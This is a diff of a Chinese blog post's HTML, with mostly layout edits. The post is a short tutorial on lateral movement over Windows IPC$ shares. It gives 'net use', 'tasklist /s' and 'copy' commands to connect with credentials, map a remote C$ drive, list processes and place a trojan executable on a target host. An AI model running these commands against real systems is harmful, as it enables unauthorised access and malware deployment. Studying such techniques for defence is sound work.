@@ -86,7 +86,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    2.4k
+                    2k
                 </span>
                 
                 
@@ -128,13 +128,13 @@
         <div class="content markdown animated fadeIn">
             <h1 id="IPC利用条件"><a href="#IPC利用条件" class="headerlink" title="IPC利用条件"></a>IPC利用条件</h1><p>服务器开启了139或者445端口，可以利用IPC$连接，获取目标主机上的目录结构、用户信息等等。</p>
 <h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>首先我们看当前IPC连接记录，这里的记录是空的，说明占时没有链接<br><img src="/2020/02/01/利用IPC进行横向渗透/1.png" alt></p>
-<p>现在我们建立一个完整的连接<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.1\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></div></figure></p>
+<p>现在我们建立一个完整的连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.1\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/02/01/利用IPC进行横向渗透/2.png" alt><br>这个时候我们再net view，发现成功建立连接<br><img src="/2020/02/01/利用IPC进行横向渗透/3.png" alt></p>
-<p>然后可以将目标机器的磁盘映射出来，这里我把目标机器的C盘映射到了本机的F盘<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use F: \\127.0.0.1\c$ &quot;密码&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></div></figure></p>
+<p>然后可以将目标机器的磁盘映射出来，这里我把目标机器的C盘映射到了本机的F盘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use F: \\127.0.0.1\c$ &quot;密码&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/02/01/利用IPC进行横向渗透/4.png" alt><br><img src="/2020/02/01/利用IPC进行横向渗透/5.png" alt></p>
-<p>查看下目标机器的进程<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /s 192.168.43.100 /u username /p password</span><br></pre></td></tr></table></div></figure></p>
+<p>查看下目标机器的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /s 192.168.43.100 /u username /p password</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/02/01/利用IPC进行横向渗透/6.png" alt></p>
-<p>利用copy命令将我们构造好的木马程序复制到目标机器上面<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy ccc.exe \\192.168.43.100\C$</span><br><span class="line"></span><br><span class="line">dir \\192.168.43.100\C&amp;</span><br></pre></td></tr></table></div></figure></p>
+<p>利用copy命令将我们构造好的木马程序复制到目标机器上面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy ccc.exe \\192.168.43.100\C$</span><br><span class="line"></span><br><span class="line">dir \\192.168.43.100\C&amp;</span><br></pre></td></tr></table></figure></p>
 <p>然后怎么玩就看思路了</p>
 <p>这个ipc的利用前提也是要有目标服务器的账号密码或者账号为空的情况下才能进去，有了账号密码可以直接3389了吧，哈哈哈</p>
 
